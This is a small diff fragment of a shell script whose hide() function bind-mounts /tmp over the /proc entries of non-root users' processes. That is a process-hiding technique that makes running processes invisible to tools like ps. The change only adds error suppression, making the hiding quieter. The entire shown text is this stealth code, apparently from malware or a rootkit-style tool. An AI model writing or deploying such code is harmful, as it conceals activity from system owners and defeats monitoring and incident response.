@@ -24,7 +24,7 @@ hide(){
                 if [ $ALL == "root" ]; then
                         echo "skipping root user"; continue
                 fi
-                ps aux | grep $ALL | awk -F' ' '{print $2}' | xargs -I{} mount -o bind /tmp /proc/{}
+                ps aux | grep $ALL | awk -F' ' '{print $2}' | xargs -I{} mount -o bind /tmp /proc/{} 2>/dev/null
         done
 }
 run
